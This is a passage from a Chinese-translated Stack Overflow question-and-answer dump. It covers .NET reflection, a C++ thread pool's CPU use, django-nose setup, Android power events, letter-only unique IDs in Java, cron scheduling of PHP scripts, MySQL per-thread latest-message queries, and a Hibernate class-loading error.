如果您有一个或多个程序集，这很容易。您甚至可以使用来自 powershell: 的 System.Reflection `[System.Reflection.Assembly]::ReflectionOnlyLoad(..)`。或者您可以使用 Mono.Cecil 进行装配检查。

但是，如果您已经拥有程序集，请使用[NDepend](http://www.ndepend.com/)。您将获得比您需要的更多的代码信息，并且他们可以免费试用。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T12:54:45.817

如上所述使用反射 - 这将仅返回您所做的功能：

```
 Assembly a = Assembly.LoadFile("Insert File Path");
  var typesWithMethods = a.GetTypes().Select(x => x.GetMethods(BindingFlags.Public).Where(y => y.ReturnType.Name != "Void" &&
                                                    y.Name != "ToString" &&
                                                    y.Name != "Equals" &&
                                                    y.Name != "GetHashCode" &&
                                                    y.Name != "GetType"));
  foreach (var assemblyType in typesWithMethods)
  {
    foreach (var function in assemblyType)
    {
      //do stuff with method
    }
  } 
```

您将有一个类型列表，然后在每个类型中，有一个函数列表。

```
 public class TestType
  {
    public void Test()
    {

    }
    public string Test2()
    {
      return "";
    }
  } 
```

使用上述测试类型，我提供的代码将打印 Test2 因为这是一个函数。希望这就是你要找的。

编辑：显然，您可以使用 GetMethods() 中的重载，使用另一篇文章中提到的绑定标志过滤到公共。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-08-09T15:40:16.980

我已尝试使用以下代码，请尝试此代码。

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
namespace filedetection
{
class Program
{
    static void Main(string[] args)
    {
        string path = @"D:\projects\projectsfortest\BusinessTest";
        DirectoryInfo d = new DirectoryInfo(path);//Assuming Test is your Folder
        FileInfo[] Files = d.GetFiles("*.cs"); //Getting Text files
        string str = "";
        foreach (FileInfo file in Files)
        {                
            Program program = new Program();
            List<string> allmethord = program.GetAllMethodNames(path+"\\"+file.Name);
            foreach (string methord in allmethord)
            {
                Console.WriteLine(methord);
            }
        }

        Console.ReadKey();
    }

    public List<string> GetAllMethodNames(string strFileName)
    {
        List<string> methodNames = new List<string>();
        var strMethodLines = File.ReadAllLines(strFileName)
                                    .Where(a => (a.Contains("protected") ||
                                                a.Contains("private") ||
                                                a.Contains("public")) &&
                                                !a.Contains("_") && !a.Contains("class"));
        foreach (var item in strMethodLines)
        {
            if (item.IndexOf("(") != -1)
            {
                string strTemp = String.Join("", item.Substring(0, item.IndexOf(")")+1).Reverse());
                strTemp = String.Join("", strTemp.Substring(0, strTemp.IndexOf("  ")).Reverse());
                methodNames.Add(strTemp);                    
            }
        }
        return methodNames.Distinct().ToList();
    }
  }
} 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-07-26T14:57:50.957

在 Project Properties 的 Build 部分中，启用 XML 文档文件。构建您的项目。输出 XML 文件为您提供所有类及其方法、参数名称/类型等的列表。

[![在此处输入图像描述](../Images/371c011e3f11f0c9cfe373742b11ab93.png)](https://i.stack.imgur.com/doDIi.jpg)

# c++ - 线程池正在占用所有 CPU 资源

> ID：12215516
> 
> 赞同：0
> 
> 时间：2012-08-31T12:35:38.597
> 
> 标签：c++, winapi, threadpool

我最近一直在研究自己的线程池实现，它运行良好（几乎）。问题是它占用了几乎所有的 CPU 资源。请看一下我的实现：

**线程池.h**

```
#include <vector>
#include <list>
#include <Windows.h>

const int DefaultThreadsNumber = 5;

class thread_pool
{
    typedef void ( *Task )( );

    void* m_hEvent;

    CRITICAL_SECTION m_hExecuteFunc;
    CRITICAL_SECTION m_hRunFunc;

    std::vector<void*> m_ThreadHandles;
    std::list<Task> m_TasksQueue;
    int m_nThreadInQueue;
    static unsigned __stdcall Run( void* thisParam );
public:
    thread_pool( int nMaxThreadNo );
    ~thread_pool();
    void Execute( Task task );
}; 
```

**线程池.cpp**

```
#include "thread_pool.h"
#include <process.h>

void* g_hTaskFinishedEvent;

thread_pool::thread_pool( int nMaxThreadNo )
{
    if ( nMaxThreadNo <= 0 )
        nMaxThreadNo = DefaultThreadsNumber;

    m_nThreadInQueue = nMaxThreadNo;
    for( int i = 0; i < nMaxThreadNo; ++i )
    {
        m_ThreadHandles.push_back((void*)_beginthreadex(NULL, 0, &Run, (void*)this, 0, 0 ));
    }

    InitializeCriticalSection( &m_hExecuteFunc );
    InitializeCriticalSection( &m_hRunFunc );
}

thread_pool::~thread_pool()
{
    for ( std::vector<void*>::iterator it = m_ThreadHandles.begin(); 
            it != m_ThreadHandles.end(); 
            ++it )
    {
        CloseHandle( *it );
    }

    DeleteCriticalSection( &m_hExecuteFunc );
    DeleteCriticalSection( &m_hRunFunc );

}

void thread_pool::Execute( Task task )
{
    EnterCriticalSection( &m_hExecuteFunc );

    m_TasksQueue.push_back( task );

    LeaveCriticalSection( &m_hExecuteFunc );

    m_hEvent = CreateEvent(NULL, true, false, NULL);
    SetEvent( m_hEvent ); // TODO: what if setEvent will fail???
}

unsigned __stdcall thread_pool::Run(void* thisParam )
{
    thread_pool *This = (thread_pool*)thisParam;
    while(true)
    {
        WaitForSingleObject( This->m_hEvent, INFINITE );
        while(!This->m_TasksQueue.empty())
        {

            EnterCriticalSection( &This->m_hExecuteFunc );

            if ( !This->m_TasksQueue.empty() ) 
            {
                This->m_TasksQueue.front()();
                This->m_TasksQueue.pop_front();

                g_hTaskFinishedEvent = CreateEvent(NULL, true, false, NULL);
                SetEvent( g_hTaskFinishedEvent );
            }

            LeaveCriticalSection( &This->m_hExecuteFunc );
        }
    }
    return 0;
} 
```

如何改进？

提前感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:40:59.153

在 CreateEvent 中，bManualReset 设置为 true，但您不会`ResetEvent`在任何地方调用。因此，一旦发出信号，事件就会永远保持设置状态，并且 WaitForSingleObject 会立即返回。使其成为自动重置事件，或`ResetEvent`在所有工作人员完成后调用。

# django - 如何正确安装 django-nose？

> ID：12215520
> 
> 赞同：6
> 
> 时间：2012-08-31T12:35:47.677
> 
> 标签：django, nose, django-nose

我无法让 django-nose 运行。

根据[安装说明](https://github.com/jbalogh/django-nose)，我通过以下方式安装：

1.  跑步`pip install django-nose`
2.  添加`'django_nose'`到`INSTALLED_APPS`settings.py （包括作为最后一个应用程序，以防可能的应用程序顺序问题）
3.  添加`TEST_RUNNER = 'django_nose.NoseTestSuiteRunner'`到 settings.py

当我运行测试 ie`manage.py test`时，我得到：

```
django.db.utils.DatabaseError: no such table: django_content_type 
```

我想我需要同步数据库。我正在使用南方。当我使用`manage.py syncdb`时，`django_nose`不会出现在同步应用程序列表或“未同步（使用迁移）”应用程序列表中。

最后，当我尝试与 south 同步时，即`manage.py schemamigration django_nose --initial`，我得到：

```
django.core.exceptions.ImproperlyConfigured: App with label django_nose is missing a models.py module. 
```

我在 virtualenv 中安装了带有 South 版本 0.7.5 的 Django 1.4。

我究竟做错了什么？如果没有，我该如何调试这个安装问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:55:16.693

看起来这是关于应用程序订购的问题，来自 django-nose 手册的引用：

> 与南一起使用
> 
> South 安装了自己的测试命令，在测试期间关闭迁移。确保在 INSTALLED_APPS 中 django-nose 出现在 south 之后，以便使用 django_nose 的测试命令。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-19T00:50:05.020

如果您仔细阅读 github 上的文档，问题是安装**south**时需要将**django_nose放在****south**下方，[阅读更多](https://github.com/jbalogh/django-nose#using-with-south)。

因此，settings.py 文件中的 INSTALLED_APPS 应如下所示：

```
INSTALLED_APPS = (
.....other apps...
....

south,
django_nose,
) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-18T17:09:47.410

在 INSTALLED_APPS 中使用 kombu.transport.django 时，我也遇到了类似的问题。我得到的错误是“配置不当：带有标签 django 的应用缺少 models.py 模块。”。看起来 South 的顺序确实很重要。我所做的是将**南**放在 INSTALLED_APPS 的最底部，

```
INSTALLED_APPS = (
'django.contrib.auth',
'django.contrib.contenttypes',
'django.contrib.sessions',
'django.contrib.sites',
'django.contrib.messages',
'django.contrib.staticfiles',
'djcelery',
'kombu.transport.django',
'sdm',
'cycletel_admin',
'django.contrib.admin',
'lettuce.django',
'south'
) 
```

这有助于解决问题。迁移成功运行。我使用 Django 1.5

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-23T01:21:54.827

尝试将您要测试的应用程序放入您的设置中的 PROJECT_APPS；当它没有 models.py 文件时，它会尝试测试 django_nose 并为其生成模型。

# android - 断电时关闭活动

> ID：12215521
> 
> 赞同：1
> 
> 时间：2012-08-31T12:35:57.927
> 
> 标签：android, android-activity, broadcastreceiver

我编写了一个小应用程序，用于在循环中播放单个视频。我怎么能意识到，当连接电源并再次关闭活动时，设备会唤醒并播放此视频。在此之后还应关闭屏幕以避免耗尽电池。

实际代码如下所示：

```
package org.adem.receiver;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import android.util.Log;
import org.adem.activities.AdvertiserActivity;
import org.adem.global.GlobalVariables;

public class AppReceiver extends BroadcastReceiver {

    private static final String TAG = AppReceiver.class.getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_POWER_CONNECTED.equals(intent.getAction())) {
            Log.d(TAG, "##Receiver triggered with " + intent.getAction());
            if (!checkForRunningActivity(context)) {
                initStart(context);
                Intent advertiserIntent = new Intent(context, AdvertiserActivity.class);
                advertiserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                Log.d(TAG, "##Activity started" + advertiserIntent.getComponent().getShortClassName());
                context.startActivity(advertiserIntent);
            } else {
                Log.d(TAG, "##" + intent.getAction() + " received but ignored. Activity still running.");
            }
        } else if (Intent.ACTION_POWER_DISCONNECTED.equals(intent.getAction())) {
            Log.d(TAG, "##Receiver triggered with " + intent.getAction());
            stopAllAndTurnOff(context);

            Log.d(TAG, "##" + intent.getAction() + " received but ignored. Activity is not running.");
        }

    }

    private void initStart(Context context) {
        getWakeLock(context).acquire();
        GlobalVariables.DEVICE_READY = true;
        getKeyGuardLock(context).disableKeyguard();
        Log.d(TAG, "##Wake Lock acquired");
    }

    private void stopAllAndTurnOff(Context context) {
        GlobalVariables.DEVICE_READY = false;

        if (getWakeLock(context).isHeld()) {
            getWakeLock(context).release();
            Log.d(TAG, "##Wake Lock released");
        }
    }

    private KeyguardManager.KeyguardLock getKeyGuardLock(Context context) {
        if (GlobalVariables.getLock() == null) {
            KeyguardManager.KeyguardLock lock;
            KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService(Activity.KEYGUARD_SERVICE);
            lock = keyguardManager.newKeyguardLock(Context.KEYGUARD_SERVICE);
            GlobalVariables.setLock(lock);
            Log.d(TAG, "##New KeyGuard initialized");
        }
        return GlobalVariables.getLock();
    }

    private PowerManager.WakeLock getWakeLock(Context context) {
        if (GlobalVariables.getWl() == null) {
            PowerManager.WakeLock wl;
            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, TAG);
            GlobalVariables.setWl(wl);
            Log.d(TAG, "##New Wake Lock initialized");
        }
        return GlobalVariables.getWl();
    }

    private boolean checkForRunningActivity(Context context) {
        ActivityManager manager = (ActivityManager) context.getSystemService(Activity.ACTIVITY_SERVICE);
        for (ActivityManager.RunningTaskInfo task : manager.getRunningTasks(Integer.MAX_VALUE)) {
            Log.d(TAG, task.baseActivity.getClassName());
            if (task.baseActivity.getClassName().equals("org.adem.activities.AdvertiserActivity")
                    || task.baseActivity.getClassName().equals("org.adem.activities.VideoViewActivity")) {
                return true;
            }
        }
        return false;
    }
} 
```

当我在真实设备上测试它时，它每次都说活动仍在运行。但为什么？

谢谢

亚当

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T12:44:59.763

您可以添加广播接收器以接收电池变化。

获取 Intent.ACTION_BATTERY_CHANGED 的响应

```
Intent batteryIntent = context.getApplicationContext().registerReceiver(null,
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED)); 
```

一旦接收器收到检查连接。

正在充电：

安卓USB连接

```
public static boolean isConnected(Context context) {
    Intent intent = context.registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
    int plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
    return plugged == BatteryManager.BATTERY_PLUGGED_AC || plugged == BatteryManager.BATTERY_PLUGGED_USB;
} 
```

在清单文件中添加权限：

```
android.permission.DEVICE_POWER 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:53:34.103

我想首先你把它放在清单中。

> android.permission.DEVICE_POWER

之后开始广播接收器。然后开始你的活动。希望它会奏效。

# java - 如何在java中生成一个真正唯一的char only字符串

> ID：12215523
> 
> 赞同：2
> 
> 时间：2012-08-31T12:36:03.090
> 
> 标签：java, surrogate-key

有没有办法生成一个唯一的代理字符串，如 UUID.randomUUID() 但只包含字符（意味着没有数字）？该字符串存储在不同主机上的多个数据库中，并且必须在系统范围内是唯一的（即使我同时生成两个密钥 - 即通过线程）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T12:44:38.233

[Apache Commons Lang 3](http://commons.apache.org/lang/)有一个名为的类[`RandomStringUtils`](http://commons.apache.org/lang/apidocs/org/apache/commons/lang3/RandomStringUtils.html)，可用于获取随机字母字符串：

```
int stringSize = 8;  // just choose the size better suits you
String randomString = RandomStringUtils.randomAlphabetic(stringSize); 
```

如果即使在运行多个线程时也需要它是唯一的，那么您将需要一种方法来同步它们（可能使用`synchronized`块和`while`循环）并在该数据库中检查不存在与生成的字符串相等的先前字符串。

**编辑 - 一个粗略的例子**

```
Set<String> previousKeys = new HashSet<String>();

public String generateKey(int stringSize) {
    String randomString = "";
    synchronized(previousKeys) {
        do {
            randomString = RandomStringUtils.randomAlphabetic(stringSize);
        } while (randomString.length() == 0 || !previousKeys.add(randomString));
    }
    return randomString;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T12:43:15.660

刚刚写了这个 - 大写字符的随机字符串：

```
package dan;

import java.util.Random;

public class RandText {

    /**
     * @param args
     */
    public static void main(String[] args) {

        String s = getRandomText(100);
        System.out.println(s);

    }

    public static String getRandomText(int len) {
        StringBuilder b = new StringBuilder();
        Random r = new Random();
        for (int i = 0; i<len;i++) {
            char c = (char)(65+r.nextInt(25));
            b.append(c);
        }
        return b.toString();
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T12:44:41.673

如果您要生成随机字符，请使用随机 int 生成器，并让它生成一个随机数 65 - 122。但请记住，91-96 在 ascii 中不是 AZ 或 az。请记住，您需要将此 int 转换为 char。

这可能会有所帮助：[http ://www.asciitable.com/](http://www.asciitable.com/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T12:49:02.417

```
String id = UUID.randomUUID().toString().replaceAll("-", "");
id.replaceAll("0","zero");
// [...]
id.replaceAll("9","nine"); 
```

我对这种方法感觉不好。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-31T12:55:02.723

抓住你的 UUID，去掉“-”。转换字符 '1' -> 'Z'、'2' -> 'Y' 等。

# cron - 如何每天执行一个php脚本

> ID：12215524
> 
> 赞同：2
> 
> 时间：2012-08-31T12:36:12.840
> 
> 标签：cron, ubuntu-server

> **可能重复：**
> [Ubuntu for php 上的 Cron 作业](https://stackoverflow.com/questions/1210930/cron-job-on-ubuntu-for-php)

我正在运行 ubuntu 服务器，并且想每天运行一个 php 脚本。我做了一些研究，发现 cron 是最好的方法，但是，这就是我被卡住的地方，互联网上很多关于 cron 的信息很难理解和理解。

所以我想每天执行一次简单的 php 脚本，我为测试而制作的脚本只是从数据库中删除一条记录，但真正的脚本会做更多的事情。

我尝试通过 plesk 设置一个任务，该任务是通过我的网络主机服务提供的，但它似乎没有在我想要的时候执行，我用 1 表示分钟，22 表示几小时，* 表示一天，* 表示一周，* 表示月，并认为这将在每天 22:01 执行。

我的服务器上有目录： cron.hourly cron.daily cron.weekly cron.monthly

我以为我可以在那里转储我的文件，例如它会每天执行，但我猜我需要制作一个 cron 脚本来调用一个 php 脚本，对吗？

如果我要采取将文件放入 cron.daily 文件夹的方式，我将如何处理？

另外，如果我需要在 php 方面采取任何步骤，请告诉我？

非常感谢您的时间。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-31T12:45:50.457

有几种方法可以设置 cron 作业。假设您获得了 shell 访问权限，您可以`crontab -e`从控制台执行并在那里定义工作，即像这样：

```
1 22 * * * command 
```

`command`这将在每天 22:01触发（无论它是什么）（不知道为什么你将分钟设置为`1`而不是`0`）。要从那里启动 PHP 脚本，您要么必须安装`php-cli`，然后以这种方式调用它：

```
1 22 * * * <path>/php -q script.php 
```

你也可以在这里调用 bash 脚本，设置路径等所有东西，然后从 bash 调用你的 php 脚本 - 有时这样做更简单，而不是为 cron 制作太长的命令行。而且以后更新更简单。`chmod a+x script.php`此外，您可以通过设置执行位 ( ) 并添加 shell 的 shebang将您的 php 脚本转换为 bash-runnable 脚本：

```
#!/usr/bin/php -q
<?php
   ... 
```

如果您的脚本有太多依赖项并且您希望通过 Web 调用它，您可以使用它`wget`来模拟浏览器。所以你`command`会是：

```
/usr/bin/wget --delete-after --quiet --spider <URL-TO-YOUR-SCRIPT> 
```

wget手册可以通过`man wget`或访问`wget -h`，或者[在这个网站上](http://www.gnu.org/software/wget/manual/wget.html)。或者，您可以使用包中的`HEAD`工具`perl-www`- 但它需要 perl 而 wget 是一个独立的工具。如果您将 HTTPS 与自签名证书一起使用，请添加`--no-check-certificate`到您的调用参数。您可能还想设置`.htaccess`和限制对您的 cron 脚本的 Web 访问到 localhost/127.0.0.1

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-31T12:46:59.573

每一分钟：

```
* * * * * /path/script.php 
```

每 24 小时（每个午夜）：

```
0 0 * * * /path/script.php 
```

请参阅此参考以了解 crontab 的工作原理：[http](http://adminschoice.com/crontab-quick-reference) ://adminschoice.com/crontab-quick-reference，以及构建 cron jobx 的便捷工具：http: [//www.htmlbasix.com/crontab.shtml](http://www.htmlbasix.com/crontab.shtml)

# mysql - 按对话线程中的最新响应对消息进行分组

> ID：12215525
> 
> 赞同：3
> 
> 时间：2012-08-31T12:36:15.053
> 
> 标签：mysql

我需要一个简单的用户之间的内部消息传递系统。

我的桌子：

```
+--------------+         +---------------------+
|   messages   |         |        users        |
+----+---------+         +---------------------+
| id | message |         | id | username | ... 
+----+---------+         +---------------------+

+------------------------------------------------------------------------------+
|                                 users_messages                               |
+------------------------------------------------------------------------------+
| id | from_usr_id | to_usr_id | msg_id | thread_id | read | sent_at | read_at |
+------------------------------------------------------------------------------+ 
```

`INT 'thread_id'`表示对话线程，用于对消息进行分组。

`BOOLEAN 'read'`表示用户是否打开/查看了消息。

我想将消息分组`'thread_id'`，排序，`'sent_at'`以便我可以按线程向用户显示他的最新消息。我还想计算每个线程中的消息。

我想为特定的用户 ID 获得类似的东西：

```
+----------------------------------------------------------------------------
| last_messages_by_conversation
+----------------------------------------------------------------------------
| message | from_username | sent_at | count_thread_msgs | count_unread_msg |
+---------------------------------------------------------------------------- 
```

`TEXT 'message'`是具体的最新消息`'thread_id'`

`VARCHAR 'from_username'`并`DATETIME 'sent_at'`与最新消息有关。

`INT 'count_thread_msgs'`和`INT 'count_unread_msg'`与线程相关，表示线程中的消息总数和未读消息数。

每行代表一个线程/对话（按 分组`'thread_id'`），显示该特定线程的最后一条消息（按 排序`'sent_at'`）。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-02T15:48:10.677

您正在寻找[groupwise maximum](http://dev.mysql.com/doc/en/example-maximum-column-group-row.html)，可以通过首先对`users_messages`表格进行分组`thread_id`并选择来找到它`MAX(sent_at)`，然后将结果连接回`users_messages`表格以查找该最大记录的其他字段。

我发现这`NATURAL JOIN`是一个非常方便的快捷方式：

```
SELECT   messages.message,
         users.username AS from_username,
         t.sent_at,
         t.count_thread_msgs,
         t.count_unread_msg
FROM     users_messages NATURAL JOIN (
  SELECT   thread_id,
           to_usr_id,
           MAX(sent_at)  AS sent_at,
           COUNT(*)      AS count_thread_msgs,
           SUM(NOT read) AS count_unread_msg
  FROM     users_messages
  WHERE    to_usr_id = ?
  GROUP BY thread_id
) t JOIN messages ON messages.id = users_messages.msg_id
    JOIN users    ON users.id    = users_messages.from_usr_id 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T13:25:39.107

```
SELECT 
      users.id,
      users.username,
      user_messages.thread_id,
      user_messages.unread ,
      messages.message 
FROM users
LEFT JOIN (SELECT 
                 from_usr_id , 
                 msg_id,
                 count(thread_id)) as thread_id,
                 count(read_at) as  unread  
          FROM user_messages)as user_messages on user_messages.from_usr_id = users.id
LEFT JOIN messages on messages.id = user_messages.msg_id 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-03T02:02:17.317

你可以试试这个解决方案：

```
SELECT   c.message,
         d.username AS from_username,
         b.sent_at,
         a.count_thread_msgs,
         a.count_unread_msg
FROM     (
         SELECT   MAX(id)  AS maxid,
                  COUNT(*) AS count_thread_msgs,
                  COUNT(CASE WHEN `read` = 0 AND <uid> = to_usr_id THEN 1 END) AS count_unread_msg
         FROM     users_messages
         WHERE    <uid> IN (from_usr_id, to_usr_id)
         GROUP BY thread_id
         ) a
JOIN     users_messages b ON a.maxid       = b.id
JOIN     messages c       ON b.msg_id      = c.id
JOIN     users d          ON b.from_usr_id = d.id
ORDER BY b.sent_at DESC 
```

* * *

这将获取用户`<uid>`启动或参与的每个线程中的最新消息。

最新消息基于`id`每个 thread_id 的最大值。

该解决方案做出以下假设：

*   `id`in`users_messages`是每个新行的唯一自动递增 int 。
*   每个线程包含不超过两个用户之间的对应关系。

如果线程可以包含两个以上的用户，则需要稍微调整查询以得出准确的计数聚合。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-31T13:18:02.533

试试这个，让我知道，改变`$$`你的`user ID`..

```
select u.username,msg.message,m.sent_at,

(select count(*) from user_message where read=0 and to_usr_id=$$) as count_thread_msgs,

(select count(*) from user_message where to_usr_id= $$) as count_unread_msg

from users as u join user_messages as m

on u.id=m.id where u.id=$$ 
```

`join messages as msg on msg.id=m.id`

```
group by u.id;` 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-05T13:43:28.203

试试这个查询 -

```
SELECT
  m.message,
  u.username from_username,
  um1.sent_at,
  um2.count_thread_msgs,
  um2.count_unread_msg
FROM users_messages um1
  JOIN (
       SELECT
         thread_id,
          MAX(sent_at) sent_at,
          COUNT(*) count_thread_msgs,
          COUNT(IF(`read` = 1, `read`, NULL)) count_unread_msg
        FROM users_messages GROUP BY thread_id) um2
    ON um1.thread_id = um2.thread_id AND um1.sent_at = um2.sent_at
JOIN messages m
  ON m.id = um1.msg_id
JOIN users u
  ON u.id = um1.from_usr_id
-- WHERE u.id = 100 -- specify user id here 
```

关于您的问题的答案：

1.  关于上次日期时间：我对查询进行了一些更改，只需尝试新的。
2.  关于特定用户：添加 WHERE 条件过滤用户 - `...WHERE u.id = 100`。
3.  关于许多记录：因为您加入了另一个表（`messages`和`users`），并且可以有多个相同的记录`thread_id`。为避免这种情况，您应该按字段对结果集进行分组`thread_id`并使用聚合函数来获得单个结果，例如使用 GROUP_CONCAT 函数。

# java - java.lang.NoClassDefFoundError：无法初始化类 org.hibernate.ejb.Ejb3Configuration

> ID：12215527
> 
> 赞同：5
> 
> 时间：2012-08-31T12:36:19.343
> 
> 标签：java, hibernate, jpa, ejb

我是 EJB 的新手。我的经理告诉我在我们的测试服务器中部署一个 ejb 应用程序进行一些修改。该应用程序已经在我们的生产服务器中运行。但是当我部署应用程序时，我遇到了一个异常。

我们正在使用 Glassfish 应用服务器

异常堆栈跟踪：

```
java.lang.NoClassDefFoundError: Could not initialize class org.hibernate.ejb.Ejb3Configuration
        at org.hibernate.ejb.HibernatePersistence.createContainerEntityManagerFactory(HibernatePersistence.java:130)
        at com.sun.enterprise.server.PersistenceUnitLoaderImpl.load(PersistenceUnitLoaderImpl.java:149)
        at com.sun.enterprise.server.PersistenceUnitLoaderImpl.load(PersistenceUnitLoaderImpl.java:84)
        at com.sun.enterprise.server.AbstractLoader.loadPersistenceUnits(AbstractLoader.java:915)
        at com.sun.enterprise.server.ApplicationLoader.doLoad(ApplicationLoader.java:184)
        at com.sun.enterprise.server.TomcatApplicationLoader.doLoad(TomcatApplicationLoader.java:126)
        at com.sun.enterprise.server.ExtendedApplicationLoader.doLoad(ExtendedApplicationLoader.java:134)
        at com.sun.enterprise.server.AbstractLoader.load(AbstractLoader.java:240)  
        at com.sun.enterprise.server.ApplicationManager.applicationDeployed(ApplicationManager.java:336)  
        at com.sun.enterprise.server.ApplicationManager.applicationDeployed(ApplicationManager.java:210)  
        at com.sun.enterprise.server.ApplicationManager.applicationDeployed(ApplicationManager.java:645)  
        at com.sun.enterprise.admin.event.AdminEventMulticaster.invokeApplicationDeployEventListener(AdminEventMulticaster.java:959)  
        at com.sun.enterprise.admin.event.AdminEventMulticaster.handleApplicationDeployEvent(AdminEventMulticaster.java:943)
        at com.sun.enterprise.admin.event.AdminEventMulticaster.processEvent(AdminEventMulticaster.java:467)  
    at com.sun.enterprise.admin.event.AdminEventMulticaster.multicastEvent(AdminEventMulticaster.java:182)
    at com.sun.enterprise.admin.server.core.DeploymentNotificationHelper.multicastEvent(DeploymentNotificationHelper.java:308)
    at com.sun.enterprise.deployment.phasing.DeploymentServiceUtils.multicastEvent(DeploymentServiceUtils.java:231)
    at com.sun.enterprise.deployment.phasing.ServerDeploymentTarget.sendStartEvent(ServerDeploymentTarget.java:298)
    at com.sun.enterprise.deployment.phasing.ApplicationStartPhase.runPhase(ApplicationStartPhase.java:132)
    at com.sun.enterprise.deployment.phasing.DeploymentPhase.executePhase(DeploymentPhase.java:108)
    at com.sun.enterprise.deployment.phasing.PEDeploymentService.executePhases(PEDeploymentService.java:966)
    at com.sun.enterprise.deployment.phasing.PEDeploymentService.start(PEDeploymentService.java:609)
    at com.sun.enterprise.deployment.phasing.PEDeploymentService.start(PEDeploymentService.java:653)
    at com.sun.enterprise.admin.mbeans.ApplicationsConfigMBean.start(ApplicationsConfigMBean.java:773)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:616)
    at com.sun.enterprise.admin.MBeanHelper.invokeOperationInBean(MBeanHelper.java:390)
    at com.sun.enterprise.admin.MBeanHelper.invokeOperationInBean(MBeanHelper.java:373)
    at com.sun.enterprise.admin.config.BaseConfigMBean.invoke(BaseConfigMBean.java:477)
    at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:857)
    at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:795)
    at sun.reflect.GeneratedMethodAccessor18.invoke(Unknown Source)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:616)
    at com.sun.enterprise.admin.util.proxy.ProxyClass.invoke(ProxyClass.java:90)
    at $Proxy1.invoke(Unknown Source)  
    at com.sun.enterprise.admin.server.core.jmx.SunoneInterceptor.invoke(SunoneInterceptor.java:304)
    at com.sun.enterprise.interceptor.DynamicInterceptor.invoke(DynamicInterceptor.java:170)
    at com.sun.enterprise.deployment.client.DeploymentClientUtils.startApplication(DeploymentClientUtils.java:159)
    at com.sun.enterprise.deployment.client.DeployAction.run(DeployAction.java:538)
    at java.lang.Thread.run(Thread.java:636) 
```

当我重新启动服务器时，我得到了这些：

```
Unexpected error occurred while loading applications  
java.lang.IncompatibleClassChangeError: Implementing class  
at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(ClassLoader.java:632)
    at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
    at java.net.URLClassLoader.defineClass(URLClassLoader.java:277)
    at java.net.URLClassLoader.access$000(URLClassLoader.java:73)
    at java.net.URLClassLoader$1.run(URLClassLoader.java:212)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:205)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:319)
    at com.sun.appserv.server.util.ASURLClassLoader.loadClass(ASURLClassLoader.java:144)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:264)
    at java.lang.ClassLoader.loadClassInternal(ClassLoader.java:332)
    at org.hibernate.ejb.Ejb3Configuration.<clinit>(Ejb3Configuration.java:107)
    at org.hibernate.ejb.HibernatePersistence.createContainerEntityManagerFactory(HibernatePersistence.java:130)
    at com.sun.enterprise.server.PersistenceUnitLoaderImpl.load(PersistenceUnitLoaderImpl.java:149)
    at com.sun.enterprise.server.PersistenceUnitLoaderImpl.load(PersistenceUnitLoaderImpl.java:84)
    at com.sun.enterprise.server.AbstractLoader.loadPersistenceUnits(AbstractLoader.java:915)
    at com.sun.enterprise.server.ApplicationLoader.doLoad(ApplicationLoader.java:184)
    at com.sun.enterprise.server.TomcatApplicationLoader.doLoad(TomcatApplicationLoader.java:126)
    at com.sun.enterprise.server.ExtendedApplicationLoader.doLoad(ExtendedApplicationLoader.java:134)
    at com.sun.enterprise.server.AbstractLoader.load(AbstractLoader.java:240)
